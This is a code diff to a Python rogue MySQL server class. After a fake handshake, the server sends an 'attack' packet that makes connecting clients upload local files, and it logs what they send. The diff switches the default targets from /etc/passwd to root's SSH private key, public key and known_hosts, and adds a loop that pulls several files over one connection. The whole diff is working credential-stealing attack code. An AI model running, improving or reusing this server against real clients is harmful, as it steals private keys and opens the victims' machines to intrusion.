@@ -32,11 +32,14 @@ def save_sched():
 
 
 class mysql:
-    def __init__(self, addrress, port = 3306, count = 10, file="/etc/passwd"):
+    def __init__(self, addrress, port = 3306, count = 10, file=['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub']):
         self.addrress = addrress
         self.port = port
         self.count = count
-        self.files = ['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub']
+        if type(file) == str:
+            self.files = [file]
+        else:
+            self.files = file
         t = Thread(target=save_sched, args=())
         t.start()
     def start(self):
@@ -98,28 +101,34 @@ class mysql:
 
         return length + pck_num + data
     def main(self, conn, addr):
-        fileNum = 0
-        if addr in info.keys():
-            fileNum = len(info[addr]) % len(self.files)
-        filename = self.files[fileNum]
         data = self.greet()
         conn.send(data)
         conn.recv(1024)
         data = self.resp_ok()
         conn.send(data)
-        conn.recv(1024)
-        data = self.attack(filename)
-        conn.send(data)
-        print("*" * 88)
-        print("addr: ", addr)
-        print("filename ", filename)
-        data = conn.recv(10240)
-        if fileNum == 0:
-            info[addr] = []
-        info[addr].append({filename:data})
-        print(data)
-        print("*" * 88)
-        conn.close()
+        while True:
+            try:
+                fileNum = 0
+                if addr in info.keys():
+                    fileNum = len(info[addr]) % len(self.files)
+                filename = self.files[fileNum]
+                conn.recv(1024)
+                data = self.attack(filename)
+                conn.send(data)
+                print("*" * 88)
+                print("addr: ", addr)
+                print("filename ", filename)
+                data = conn.recv(10240)
+                if fileNum == 0:
+                    info[addr] = []
+                info[addr].append({filename:data})
+                print(data)
+                print("*" * 88)
+                conn.close()
+            except Exception as e:
+                conn.close()
+                break
+
         
 
 
